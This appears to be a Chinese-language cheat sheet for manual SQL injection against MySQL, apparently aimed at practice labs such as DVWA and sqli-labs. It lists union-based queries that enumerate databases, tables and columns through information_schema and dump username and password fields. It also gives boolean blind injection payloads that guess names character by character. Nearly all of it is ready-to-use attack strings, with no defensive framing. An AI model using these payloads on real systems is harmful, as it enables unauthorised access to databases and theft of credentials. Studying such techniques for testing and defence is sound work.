🍭信息数据库（MySql 5.0以上）

🍭information_schema

系统数据库，记录当前数据库的数据库，表，列，用户权限信息。

🍭SCHEMATA(所有数据库的基本信息)

查询数据库：union select 1,2,group_concat(schema_name) from information_schema.schemata

🍭TABLES(存储表信息)

查询表： union select 1,2,group_concat(table_name) from
information_schema.tables where table_schema='表名'

🍭COLUMNS(储存列信息)

查询列：union select 1,2,group_concat(column_name) from information_schema.columns where table_name='表名'

🍭字符串连接函数

concat(str1,str2,…)——没有分隔符地连接字符串

concata_ws(separator,str1,str2,…)——含有分隔符地连接字符串

group_concat(str1,str2,…)——连接一个组的所有字符串，并以逗号分隔每一条数据

🍭基本手工注入流程

🍭获取字段数

order by n

🍭获取系统数据库名

select 1,2,schema_name from information_schema.schemata

🍭获取当前数据库名

select 1,2,3,database()

🍭获取数据库中的表

select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()

or

select 1,2,table_name from information_schema.tables where table_schema=database() limit 0,1

但法二需一一查询表名。

🍭获取表中的字段

select 1,2,group_concat(column_name) from information_shema.columns where table_schema=database() and table_name='表名'

🍭获取各个字段的值

select 1,group_concat(username,password) from users//假设已经获取到表名为user，且字段为username和password

🍭常用注入方式

🍭union注入

union的作用是将两个sql语句进行联合。当注入参数的数据在数据库中不存在时，两个sql语句进行联合操作时，前一个语句选择的内容为空时，后面语句的查询内容就显示出来。如:

id =-1 union select 1,2,3

🍭布尔注入(构造逻辑判断)

boolean 根据注入信息返回true or fales,无任何报错

相关函数

length(str) ：返回字符串str的长度

substr(str, pos, len) ：将str从pos位置开始截取len长度的字符进行返回。注意这里的pos位置是从1开始的，不是数组的0开始

mid(str,pos,len) ：跟substr一样，截取字符串

ascii(str) ：返回字符串str的最左面字符的ASCII代码值

ord(str) ：将字符或布尔类型转成ascll码

' and length (database())=x(某个值，用大于或者小于某个值也可以)--+//猜数据库名长度：(猜对时页面才会显示正常)

' and length((select schema_name from information_schema.schemata limit 0,1))=18 --+ //查询所有数据库的长度

' and left(database(),1)='s'--+ //猜数据库的名字 

' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)) = 101--+//获取数据库下的表

' and length((select table_name from information_schema.tables where table_schema='dvwa' limit 0,1))=9 --+ 查询表的长度

' and 1=(select 1 from information_schema.columns where table_name='users' and column_name regexp '^us[a-z]' limit 0,1)--+//获取表里的列名

' and length((select column_name from information_schema.columns where table_schema=database() and table_name="users"limit 0,1))>1 --+ //查询列的长度

' and ord(mid((select ifnull(cast(username as char),x（错误返回值）)from security.users order by id limit 0,1),1,1))=68--+ //获取列的内容

' and ((select user from dvwa.users limit 0,1) regexp '^a[a-z]' )=1 --+//正则猜测dvwa数据库里的users表里的user字段里的第一个值
